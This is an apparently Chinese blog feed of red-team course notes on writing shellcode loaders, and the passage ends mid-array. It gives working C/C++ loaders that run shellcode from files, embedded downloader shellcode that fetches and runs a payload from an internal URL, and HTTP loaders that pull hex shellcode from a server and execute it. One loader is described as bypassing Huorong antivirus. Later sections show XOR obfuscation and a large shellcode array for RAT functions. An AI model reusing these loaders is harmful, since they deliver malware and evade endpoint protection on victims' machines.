        <content type="html"><![CDATA[<h2 id="开发通用的shellcode加载器（一）"><a href="#开发通用的shellcode加载器（一）" class="headerlink" title="开发通用的shellcode加载器（一）"></a>开发通用的shellcode加载器（一）</h2><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1652260396095/d57881a42fcc42b29ae5b35e1c2980ce.png" alt="image.png"></p><pre class="line-numbers language-none"><code class="language-none">char code[] = \"\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b""\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3""\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24""\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14""\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18""\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74""\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41""\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52""\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51""\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff""\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f""\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2""\x52\xff\xd0";#include "stdafx.h"#include&lt;Windows.h&gt;#include &lt;stdio.h&gt;#include &lt;fstream&gt;#include&lt;iostream&gt;using namespace std;void load(char* buf, int shellcode_size){DWORD dwThreadId; // 线程IDHANDLE hThread; // 线程句柄char* shellcode = (char*)VirtualAlloc(NULL,shellcode_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE);CopyMemory(shellcode, buf, shellcode_size);//CreateThread函数，创建线程hThread = CreateThread(NULL, // 安全描述符NULL, // 栈的大小(LPTHREAD_START_ROUTINE)shellcode, // 函数NULL, // 参数NULL, // 线程标志&amp;dwThreadId // 若成功，接收新创建的线程的线程ID DWORD变量的地址。);//通过调用 WaitForSingleObject 函数来监视事件状态,当事件设置为终止状态（WaitForSingleObject 返回 WAIT_OBJECT_0）时，每个线程都将自行终止执行。WaitForSingleObject(hThread, INFINITE); // 一直等待线程执行结束}int _tmain(int argc, _TCHAR* argv[]){char filename[] = "C:\\shellcode.bin";// 以读模式打开文件ifstream infile;//以二进制方式打开infile.open(filename, ios::out | ios::binary);infile.seekg(0, infile.end); //追溯到流的尾部int length = infile.tellg(); //获取流的长度infile.seekg(0, infile.beg);//回溯到流头部char *data = new char[length]; //存取文件内容if (infile.is_open()) {cout &lt;&lt; "reading from the file" &lt;&lt; endl;infile.read(data, length);}cout &lt;&lt; "size of data =" &lt;&lt; sizeof(data) &lt;&lt; endl;cout &lt;&lt; "size of file =" &lt;&lt; length &lt;&lt; endl;for (int i = 0; i &lt; length; i++){printf("\\%x ", data[i]);}int shellcode_size = length;load(data, shellcode_size);//加载成功并不会输出，推测load函数新创建的线程执行结束后，主进程也终止了。cout &lt;&lt; "加载成功";return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="红队shellcode下载器PayLoad的实现原理（二）"><a href="#红队shellcode下载器PayLoad的实现原理（二）" class="headerlink" title="红队shellcode下载器PayLoad的实现原理（二）"></a>红队shellcode下载器PayLoad的实现原理（二）</h2><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1652260396095/03dbc3402b864b868ce8d8b173fe08a2.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1652260396095/59ececb217ba44f2bdcd82ccff955778.png" alt="image.png"></p><pre class="line-numbers language-none"><code class="language-none">#include "stdafx.h"#include &lt;windows.h&gt;#include &lt;stdio.h&gt;char pdownLoadBuffer[]={"\xe9\x88\x00\x00\x00\x5f\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68" "\x08\x8b\xf7\x6a\x02\x59\xe8\x31\x00\x00\x00\xe2\xf9\x68\x6f\x6e\x00\x00\x68\x75\x72" "\x6c\x6d\x54\xff\x16\x8b\xe8\xe8\x1b\x00\x00\x00\x68\x2e\x61\x00\x00\x68\x63\x3a\x5c" "\x61\x54\x5b\x33\xc0\x50\x50\x53\x57\x50\xff\x56\x08\x50\x53\xff\x56\x04\x51\x56\x8b" "\x75\x3c\x8b\x74\x2e\x78\x03\xf5\x56\x8b\x76\x20\x03\xf5\x33\xc9\x49\x41\xad\x03\xc5" "\x33\xdb\x0f\xbe\x10\x3a\xd6\x74\x08\xc1\xcb\x0d\x03\xda\x40\xeb\xf1\x3b\x1f\x75\xe7" "\x5e\x8b\x5e\x1c\x03\xdd\x8b\x04\x8b\x03\xc5\xab\x5e\x59\xc3\xe8\x73\xff\xff\xff\x8e" "\x4e\x0e\xec\x98\xfe\x8a\x0e\x36\x1a\x2f\x70\x68\x74\x74\x70\x3a\x2f\x2f\x31\x39\x32" "\x2e\x31\x36\x38\x2e\x30\x2e\x32\x35\x30\x2f\x61\x2e\x61\x00"};int main(int argc, char* argv[]){__asm{pushadlea eax,pdownLoadBuffercall eaxpopad}return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="红队web加载shellcode实现原理（三）"><a href="#红队web加载shellcode实现原理（三）" class="headerlink" title="红队web加载shellcode实现原理（三）"></a>红队web加载shellcode实现原理（三）</h2><pre class="line-numbers language-none"><code class="language-none">需要搭建web/ape环境.#include &lt;string&gt;#include &lt;windows.h&gt;#include &lt;winhttp.h&gt;#include&lt;iostream&gt;#pragma comment(lib, "winhttp.lib")using namespace std;char* WinGet(char* ip, int port, char* url){HINTERNET hSession = NULL;HINTERNET hConnect = NULL;HINTERNET hRequest = NULL;//************ 将char转换为wchar_t *****************/int ipSize;wchar_t* ip_wchar;//返回接受字符串所需缓冲区的大小，已经包含字符结尾符'\0'ipSize = MultiByteToWideChar(CP_ACP, 0, ip, -1, NULL, 0); //iSize =wcslen(pwsUnicode)+1=6ip_wchar = (wchar_t*)malloc(ipSize * sizeof(wchar_t)); //不需要 pwszUnicode = (wchar_t *)malloc((iSize+1)*sizeof(wchar_t))MultiByteToWideChar(CP_ACP, 0, ip, -1, ip_wchar, ipSize);int urlSize;wchar_t* url_wchar;//返回接受字符串所需缓冲区的大小，已经包含字符结尾符'\0'urlSize = MultiByteToWideChar(CP_ACP, 0, url, -1, NULL, 0); //iSize =wcslen(pwsUnicode)+1=6url_wchar = (wchar_t*)malloc(urlSize * sizeof(wchar_t)); //不需要 pwszUnicode = (wchar_t *)malloc((iSize+1)*sizeof(wchar_t))MultiByteToWideChar(CP_ACP, 0, url, -1, url_wchar, urlSize);//************ ********************************* *****************///port = 80; //默认端口//1. 初始化一个WinHTTP-session句柄，参数1为此句柄的名称hSession = WinHttpOpen(L"WinHTTP Example/1.0",WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,WINHTTP_NO_PROXY_NAME,WINHTTP_NO_PROXY_BYPASS, 0);if (hSession == NULL) {cout &lt;&lt; "Error:Open session failed: " &lt;&lt; GetLastError() &lt;&lt; endl;exit(0);}//2. 通过上述句柄连接到服务器，需要指定服务器IP和端口号 INTERNET_DEFAULT_HTTP_PORT:80。若连接成功，返回的hConnect句柄不为NULLhConnect = WinHttpConnect(hSession, ip_wchar, port, 0);if (hConnect == NULL) {cout &lt;&lt; "Error:Connect failed: " &lt;&lt; GetLastError() &lt;&lt; endl;exit(0);}//3. 通过hConnect句柄创建一个hRequest句柄，用于发送数据与读取从服务器返回的数据。hRequest = WinHttpOpenRequest(hConnect, L"GET", url_wchar, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);//其中参数2表示请求方式，此处为Get；参数3:给定Get的具体地址，如这里的具体地址为https://www.citext.cn/GetTime.phpif (hRequest == NULL) {cout &lt;&lt; "Error:OpenRequest failed: " &lt;&lt; GetLastError() &lt;&lt; endl;exit(0);}BOOL bResults;//发送请求bResults = WinHttpSendRequest(hRequest,WINHTTP_NO_ADDITIONAL_HEADERS,0, WINHTTP_NO_REQUEST_DATA, 0,0, 0);if (!bResults) {cout &lt;&lt; "Error:SendRequest failed: " &lt;&lt; GetLastError() &lt;&lt; endl;exit(0);}else {//（3） 发送请求成功则准备接受服务器的response。注意：在使用 WinHttpQueryDataAvailable和WinHttpReadData前必须使用WinHttpReceiveResponse才能access服务器返回的数据bResults = WinHttpReceiveResponse(hRequest, NULL);}LPVOID lpHeaderBuffer = NULL;DWORD dwSize = 0;//4-3. 获取服务器返回数据LPSTR pszOutBuffer = NULL;DWORD dwDownloaded = 0;         //实际收取的字符数wchar_t* pwText = NULL;if (bResults){do{//(1) 获取返回数据的大小（以字节为单位）dwSize = 0;if (!WinHttpQueryDataAvailable(hRequest, &amp;dwSize)) {cout &lt;&lt; "Error：WinHttpQueryDataAvailable failed：" &lt;&lt; GetLastError() &lt;&lt; endl;break;}if (!dwSize)    break;  //数据大小为0  //(2) 根据返回数据的长度为buffer申请内存空间pszOutBuffer = new char[dwSize + 1];if (!pszOutBuffer) {cout &lt;&lt; "Out of memory." &lt;&lt; endl;break;}ZeroMemory(pszOutBuffer, dwSize + 1);       //将buffer置0//(3) 通过WinHttpReadData读取服务器的返回数据if (!WinHttpReadData(hRequest, pszOutBuffer, dwSize, &amp;dwDownloaded)) {cout &lt;&lt; "Error：WinHttpQueryDataAvailable failed：" &lt;&lt; GetLastError() &lt;&lt; endl;}if (!dwDownloaded)break;} while (dwSize &gt; 0);//4-4. 将返回数据转换成UTF8DWORD dwNum = MultiByteToWideChar(CP_ACP, 0, pszOutBuffer, -1, NULL, 0);    //返回原始ASCII码的字符数目   pwText = new wchar_t[dwNum];                                                //根据ASCII码的字符数分配UTF8的空间MultiByteToWideChar(CP_UTF8, 0, pszOutBuffer, -1, pwText, dwNum);           //将ASCII码转换成UTF8//printf("\n返回数据为:\n%S\n\n", pwText);}//5. 依次关闭request，connect，session句柄if (hRequest) WinHttpCloseHandle(hRequest);if (hConnect) WinHttpCloseHandle(hConnect);if (hSession) WinHttpCloseHandle(hSession);/******************   将wchar转换为char  *******************/int iSize;char* data;//返回接受字符串所需缓冲区的大小，已经包含字符结尾符'\0'iSize = WideCharToMultiByte(CP_ACP, 0, pwText, -1, NULL, 0, NULL, NULL); //iSize =wcslen(pwsUnicode)+1=6data = (char*)malloc(iSize * sizeof(char)); //不需要 pszMultiByte = (char*)malloc(iSize*sizeof(char)+1);WideCharToMultiByte(CP_ACP, 0, pwText, -1, data, iSize, NULL, NULL);return data;}int main(){char* data;data = WinGet("101.43.138.109", 2333, "hello.txt");cout &lt;&lt; "返回的数据为: " &lt;&lt; data &lt;&lt; endl;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="红队Shellode半负载式内存攻击（四）"><a href="#红队Shellode半负载式内存攻击（四）" class="headerlink" title="红队Shellode半负载式内存攻击（四）"></a>红队Shellode半负载式内存攻击（四）</h2><pre class="line-numbers language-none"><code class="language-none">#include "stdafx.h"#include "windows.h"using namespace std;int main(int argc, char **argv){    unsigned char buf[] =        "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"        "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"        "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"        "\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"        "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"        "\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"        "\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"        "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"        "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"        "\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"        "\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x68\xa6\x95\xbd\x9d\xff\xd5"        "\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"        "\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";    void *exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);    memcpy(exec, buf, sizeof buf);    ((void(*)())exec)();    return 0;}内存污染方式直接绕火绒主动防御#include "stdafx.h"#include &lt;string&gt;#include &lt;iostream&gt;#include &lt;windows.h&gt;#include &lt;winhttp.h&gt;#pragma comment(lib,"winhttp.lib")#pragma comment(lib,"user32.lib")using namespace std;void main(){    DWORD dwSize = 0;    DWORD dwDownloaded = 0;    LPSTR pszOutBuffer = NULL;    HINTERNET  hSession = NULL,        hConnect = NULL,        hRequest = NULL;    BOOL  bResults = FALSE;    hSession = WinHttpOpen(L"User-Agent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);    if (hSession)    {        hConnect = WinHttpConnect(hSession, L"127.0.0.1", INTERNET_DEFAULT_HTTP_PORT, 0);    }    if (hConnect)    {        hRequest = WinHttpOpenRequest(hConnect, L"POST", L"qing.txt", L"HTTP/1.1", WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);    }    LPCWSTR header = L"Content-type: application/x-www-form-urlencoded/r/n";    SIZE_T len = lstrlenW(header);    WinHttpAddRequestHeaders(hRequest, header, DWORD(len), WINHTTP_ADDREQ_FLAG_ADD);    if (hRequest)    {        std::string data = "name=host&amp;sign=xx11sad";        const void *ss = (const char *)data.c_str();        bResults = WinHttpSendRequest(hRequest, 0, 0, const_cast&lt;void *&gt;(ss), data.length(), data.length(), 0);        ////bResults=WinHttpSendRequest(hRequest,WINHTTP_NO_ADDITIONAL_HEADERS, 0,WINHTTP_NO_REQUEST_DATA, 0, 0, 0 );    }    if (bResults)    {        bResults = WinHttpReceiveResponse(hRequest, NULL);    }    if (bResults)    {        do        {            // Check for available data.            dwSize = 0;            if (!WinHttpQueryDataAvailable(hRequest, &amp;dwSize))            {                printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());                break;            }            if (!dwSize)                break;            pszOutBuffer = new char[dwSize + 1];            if (!pszOutBuffer)            {                printf("Out of memory\n");                break;            }            ZeroMemory(pszOutBuffer, dwSize + 1);            if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &amp;dwDownloaded))            {                printf("Error %u in WinHttpReadData.\n", GetLastError());            }            else            {                printf("ok");            }            //char ShellCode[1024];            int code_length = strlen(pszOutBuffer);            char* ShellCode = (char*)calloc(code_length  /2 , sizeof(unsigned char));            for (size_t count = 0; count &lt; code_length / 2; count++){                sscanf(pszOutBuffer, "%2hhx", &amp;ShellCode[count]);                pszOutBuffer += 2;            }            printf("%s", ShellCode);            //strcpy(ShellCode,pszOutBuffer);            void *exec = VirtualAlloc(0, sizeof ShellCode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);            memcpy(exec, ShellCode, sizeof ShellCode);            ((void(*)())exec)();            delete[] pszOutBuffer;            if (!dwDownloaded)                break;        } while (dwSize &gt; 0);    }    if (hRequest) WinHttpCloseHandle(hRequest);    if (hConnect) WinHttpCloseHandle(hConnect);    if (hSession) WinHttpCloseHandle(hSession);    system("pause");}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.14-kai-fa-gao-ji-ban-shellcode-jia-zai-qi-zhong/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.14-kai-fa-gao-ji-ban-shellcode-jia-zai-qi-zhong/</url>
      
        <content type="html"><![CDATA[<h2 id="RAT中敏感函数实现shellcode抽取（一）"><a href="#RAT中敏感函数实现shellcode抽取（一）" class="headerlink" title="RAT中敏感函数实现shellcode抽取（一）"></a>RAT中敏感函数实现shellcode抽取（一）</h2><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1652164433061/4b81c3261b41425fb762dfa233448d8e.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1652164433061/ef1e0ea78e6e4766a66073fdab5f9c60.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1652164433061/dfa2a080b1064b5792c6a6de81bebb52.png" alt="image.png"></p><pre class="line-numbers language-none"><code class="language-none">void MyEncry(LPSTR szData, WORD Size){//该数组用来异或WORD AddTable[]={3,2,5,8,5,1,2,3,2,5,3,4,1,2,4,3,5,8,2,4,5,8,1,2,4,3,1,1,8,1,2,4,3,1,1,5,2,2,1,2,1,3,5,2,2,1,2,1,3,3,1,2,3,5,2,6,2,4,1,3,2,1,2,6,2,3,3,2,1,1,3,6,2,1,2,4,4,3,1,2,3,5,2,6,3,1,2,3,5,2,6,5,2,2,1,2,1,2,6,2,3,3,2,7,1,5,2,2,1,2,1,2,3,2,5,3,4,1,2,2,3,1,2,3,5,2};WORD TableSize = sizeof(AddTable)/sizeof(WORD);WORD iCount=0;for (WORD i=0;i&lt;Size;i++){if(iCount == TableSize)iCount = 0;szData[i]^=AddTable[iCount];iCount++;}}int main(int argc, char* argv[]){char bufferEnc[0x32]={"test111111\0"};MyEncry((char *)bufferEnc,0xA);getchar();return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">shellcode:unsigned char shellcodeBuffer[950] ={        0x81, 0xEC, 0xFC, 0x00, 0x00, 0x00, 0x53, 0xBB, 0x08, 0x00, 0x00, 0x00,0x56, 0x57, 0x66, 0x89, 0x5C, 0x24, 0x12, 0x66, 0x89, 0x5C, 0x24, 0x2E,0x66, 0x89, 0x5C, 0x24, 0x36, 0x66, 0x89, 0x5C, 0x24, 0x44, 0xBA, 0x03,0x00, 0x00, 0x00, 0xB8, 0x02, 0x00, 0x00, 0x00, 0xBE, 0x05, 0x00, 0x00,0x00, 0xB9, 0x01, 0x00, 0x00, 0x00, 0xBF, 0x04, 0x00, 0x00, 0x00, 0xBB,0x06, 0x00, 0x00, 0x00, 0x66, 0x89, 0x54, 0x24, 0x0C, 0x66, 0x89, 0x44,0x24, 0x0E, 0x66, 0x89, 0x74, 0x24, 0x10, 0x66, 0x89, 0x74, 0x24, 0x14,0x66, 0x89, 0x4C, 0x24, 0x16, 0x66, 0x89, 0x44, 0x24, 0x18, 0x66, 0x89,0x54, 0x24, 0x1A, 0x66, 0x89, 0x44, 0x24, 0x1C, 0x66, 0x89, 0x74, 0x24,0x1E, 0x66, 0x89, 0x54, 0x24, 0x20, 0x66, 0x89, 0x7C, 0x24, 0x22, 0x66,0x89, 0x4C, 0x24, 0x24, 0x66, 0x89, 0x44, 0x24, 0x26, 0x66, 0x89, 0x7C,0x24, 0x28, 0x66, 0x89, 0x54, 0x24, 0x2A, 0x66, 0x89, 0x74, 0x24, 0x2C,0x66, 0x89, 0x44, 0x24, 0x30, 0x66, 0x89, 0x7C, 0x24, 0x32, 0x66, 0x89,0x74, 0x24, 0x34, 0x66, 0x89, 0x4C, 0x24, 0x38, 0x66, 0x89, 0x44, 0x24,0x3A, 0x66, 0x89, 0x7C, 0x24, 0x3C, 0x66, 0x89, 0x54, 0x24, 0x3E, 0x66,0x89, 0x4C, 0x24, 0x40, 0x66, 0x89, 0x4C, 0x24, 0x42, 0x66, 0x89, 0x4C,0x24, 0x46, 0x66, 0x89, 0x44, 0x24, 0x48, 0x66, 0x89, 0x7C, 0x24, 0x4A,0x66, 0x89, 0x54, 0x24, 0x4C, 0x66, 0x89, 0x4C, 0x24, 0x4E, 0x66, 0x89,0x4C, 0x24, 0x50, 0x66, 0x89, 0x74, 0x24, 0x52, 0x66, 0x89, 0x44, 0x24,0x54, 0x66, 0x89, 0x44, 0x24, 0x56, 0x66, 0x89, 0x4C, 0x24, 0x58, 0x66,0x89, 0x44, 0x24, 0x5A, 0x66, 0x89, 0x4C, 0x24, 0x5C, 0x66, 0x89, 0x54,0x24, 0x5E, 0x66, 0x89, 0x74, 0x24, 0x60, 0x66, 0x89, 0x44, 0x24, 0x62,0x66, 0x89, 0x44, 0x24, 0x64, 0x66, 0x89, 0x4C, 0x24, 0x66, 0x66, 0x89,0x44, 0x24, 0x68, 0x66, 0x89, 0x4C, 0x24, 0x6A, 0x66, 0x89, 0x54, 0x24,0x6C, 0x66, 0x89, 0x54, 0x24, 0x6E, 0x66, 0x89, 0x4C, 0x24, 0x70, 0x66,0x89, 0x44, 0x24, 0x72, 0x66, 0x89, 0x54, 0x24, 0x74, 0x66, 0x89, 0x74,0x24, 0x76, 0x66, 0x89, 0x44, 0x24, 0x78, 0x66, 0x89, 0x5C, 0x24, 0x7A,0x66, 0x89, 0x44, 0x24, 0x7C, 0x66, 0x89, 0x7C, 0x24, 0x7E, 0x66, 0x89,0x8C, 0x24, 0x80, 0x00, 0x00, 0x00, 0x66, 0x89, 0x94, 0x24, 0x82, 0x00,0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x84, 0x00, 0x00, 0x00, 0x66, 0x89,0x8C, 0x24, 0x86, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x88, 0x00,0x00, 0x00, 0x66, 0x89, 0x9C, 0x24, 0x8A, 0x00, 0x00, 0x00, 0x66, 0x89,0x84, 0x24, 0x8C, 0x00, 0x00, 0x00, 0x66, 0x89, 0x94, 0x24, 0x8E, 0x00,0x00, 0x00, 0x66, 0x89, 0x94, 0x24, 0x90, 0x00, 0x00, 0x00, 0x66, 0x89,0x84, 0x24, 0x92, 0x00, 0x00, 0x00, 0x66, 0x89, 0x8C, 0x24, 0x94, 0x00,0x00, 0x00, 0x66, 0x89, 0x8C, 0x24, 0x96, 0x00, 0x00, 0x00, 0x66, 0x89,0x94, 0x24, 0x98, 0x00, 0x00, 0x00, 0x66, 0x89, 0x94, 0x24, 0xA6, 0x00,0x00, 0x00, 0x66, 0x89, 0x94, 0x24, 0xAC, 0x00, 0x00, 0x00, 0x66, 0x89,0x94, 0x24, 0xB4, 0x00, 0x00, 0x00, 0x66, 0x89, 0x94, 0x24, 0xBA, 0x00,0x00, 0x00, 0x66, 0x89, 0x94, 0x24, 0xD4, 0x00, 0x00, 0x00, 0x66, 0x89,0x94, 0x24, 0xD6, 0x00, 0x00, 0x00, 0x66, 0x89, 0x94, 0x24, 0xEC, 0x00,0x00, 0x00, 0x66, 0x89, 0x94, 0x24, 0xF2, 0x00, 0x00, 0x00, 0x66, 0x89,0x94, 0x24, 0xFC, 0x00, 0x00, 0x00, 0x66, 0x89, 0x94, 0x24, 0x02, 0x01,0x00, 0x00, 0x8B, 0x94, 0x24, 0x10, 0x01, 0x00, 0x00, 0x66, 0x89, 0x84,0x24, 0x9C, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xA0, 0x00, 0x00,0x00, 0x66, 0x89, 0x84, 0x24, 0xAA, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84,0x24, 0xB0, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xB8, 0x00, 0x00,0x00, 0x66, 0x89, 0x84, 0x24, 0xBE, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84,0x24, 0xC4, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xC6, 0x00, 0x00,0x00, 0x66, 0x89, 0x84, 0x24, 0xCA, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84,0x24, 0xCE, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xD2, 0x00, 0x00,0x00, 0x66, 0x89, 0x84, 0x24, 0xD8, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84,0x24, 0xE0, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xE2, 0x00, 0x00,0x00, 0x66, 0x89, 0x84, 0x24, 0xE6, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84,0x24, 0xEA, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xEE, 0x00, 0x00,0x00, 0x66, 0x89, 0x84, 0x24, 0xF8, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84,0x24, 0xFA, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x00, 0x01, 0x00,0x00, 0x66, 0x89, 0x84, 0x24, 0x06, 0x01, 0x00, 0x00, 0x33, 0xC0, 0x66,0x89, 0x9C, 0x24, 0x9A, 0x00, 0x00, 0x00, 0x66, 0x85, 0xD2, 0x66, 0x89,0x8C, 0x24, 0x9E, 0x00, 0x00, 0x00, 0x66, 0x89, 0xBC, 0x24, 0xA2, 0x00,0x00, 0x00, 0x66, 0x89, 0xBC, 0x24, 0xA4, 0x00, 0x00, 0x00, 0x66, 0x89,0x8C, 0x24, 0xA8, 0x00, 0x00, 0x00, 0x66, 0x89, 0xB4, 0x24, 0xAE, 0x00,0x00, 0x00, 0x66, 0x89, 0x9C, 0x24, 0xB2, 0x00, 0x00, 0x00, 0x66, 0x89,0x8C, 0x24, 0xB6, 0x00, 0x00, 0x00, 0x66, 0x89, 0xB4, 0x24, 0xBC, 0x00,0x00, 0x00, 0x66, 0x89, 0x9C, 0x24, 0xC0, 0x00, 0x00, 0x00, 0x66, 0x89,0xB4, 0x24, 0xC2, 0x00, 0x00, 0x00, 0x66, 0x89, 0x8C, 0x24, 0xC8, 